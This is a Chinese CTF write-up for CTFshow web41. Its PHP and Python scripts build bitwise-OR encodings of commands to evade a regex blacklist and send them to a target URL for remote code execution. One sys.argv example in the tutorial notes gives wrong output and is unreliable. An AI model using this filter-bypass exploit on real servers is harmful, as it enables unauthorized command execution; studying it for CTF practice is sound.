---
​---
title: CTFshow_web41
date: {{ date }}
top: false
cover: false
password:
toc: true
mathjax: true
summary:
tags: CTF
categories: CTF
​---
---

# CTFshow_web41

> 参考
>
> https://blog.csdn.net/miuzzx/article/details/108569080
>
> https://wp.ctf.show/d/137-ctfshow-web-web41
>
> https://blog.csdn.net/qq_45758851/article/details/115188556



- rce_or.php

  ```php
  <?php
      $myfile=fopen("rce_or.txt","w");
      $contents="";
      for($i=0;$i<256;$i++){
          for($j=0;$j<256;$j++){
              if($i<16){
                  $hex_i='0'.dechex($i);
              }
              else{
                  $hex_i=dechex($i);
              }
              if($j<16){
                  $hex_j='0'.dechex($j);
              }
              else{
                  $hex_j=dechex($j);
              }
              $preg='/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
              if(preg_match($preg,hex2bin($hex_i))||preg_match($preg,hex2bin($hex_j))){
                  echo "";
              }
              else{
                  $a='%'.$hex_i;
                  $b='%'.$hex_j;
                  $c=(urldecode($a)|urldecode($b));
  //                此处范围是将按位或运算得到的字符限定在可见字符范围内
                  if(ord($c)>=32&&ord($c)<=126){
                      $contents=$contents.$c." ".$a." ".$b."\n";
                  }
              }
          }
      }
      fwrite($myfile,$contents);
      fclose($myfile);
  ?>
  ```

- poc.py

  ```python
  #!/usr/bin/python
  # -*- coding: UTF-8 -*-
  
  import requests
  import urllib
  from sys import *
  import os
  os.system("php rce_or.php")
  if(len(argv)!=2):
      print("="*50)
      print('USER: python exp.py <url>')
      print("eg:   python exp.py http://ctf.show/")
      print("="*50)
      exit(0)
  url=argv[1]
  def action(arg):
      s1=""
      s2=""
      for i in arg:
          f=open("rce_or.txt","r")
          while True:
              t=f.readline()
              if t=="":
                  break
              if t[0]==i:
                  # print(i)
                  s1+=t[2:5]
                  s2+=t[6:9]
                  break
          f.close()
      output="(\""+s1+"\"|\""+s2+"\")"
      return(output)
  
  while True:
      param=action(input("\n[+] your function: "))+action(input("[+] your command: "))
      print('\n',param)
      
      data={
          'c':urllib.parse.unquote(param)
      }
      print(data)
  
      r=requests.post(url,data=data)
      print("\n[*] result:\n"+r.text)
  ```

- php脚本说明

  作用:用未被过滤字符按位或`|`运算得到一个可见字符字典

  - hex2bin()![image-20210521213715481](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210521213715481.png)
  - urldecode()![image-20210521213757308](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210521213757308.png)
  - 

- py脚本说明

  - ```python
    from sys import *
    import sys
    ```

    以上两个区别在于,前者在脚本中能直接调用sys函数,后者需要加上`sys.`前缀,因此可以直接调用argv

  - sys.argv[]用法简明阐述

    ```python
    #test.py
    import sys
    ro=sys.argv[0]
    print(ro)
    ```

    终端运行该脚本打印出的是当前脚本的绝对路径

    ```python
    #test.py
    import sys
    ro=sys.argv[1]
    print(ro)
    ```

    终端运行`python3 test.py rollinon`终端会输出`rollinon`

    ```python
    #test.py
    import sys
    ro=sys.argv[2:]
    print(ro)
    ```

    终端运行`python3 test.py 1 2 3 4 5 6`终端会输出`['2', '3', '4', '5']`

    即sys.argv[]实质上为一个列表,记录用户终端输入的参数

  - python函数参数中arg,*args,**kwargs的区别

    - arg为对应位置的参数
    - *arg用来将可变参数打包成tuple(元组)给函数体调用
    - **kwargs用来将关键字参数打包成dict(字典)给函数体调用

    在*Python*中一种可以使用5种*传递参数的形式*(位置*参数*、默认*参数*、变长*参数*、关键字*参数*、命名关键字*参数*) 

  - urllib.parse.unquote()

    按照标准，URL只容许一部分ASCII字符，其余字符（如汉字）是不符合标准的，此时就要进行编码。

- 做题中遇到的问题

  题中Hackbar手动提交Payload时用Burp抓包![image-20210521212233447](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210521212233447.png)会发现浏览器会再次编码,导致错误

  因此需要从Burp中提交![image-20210521212420267](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210521212420267.png)

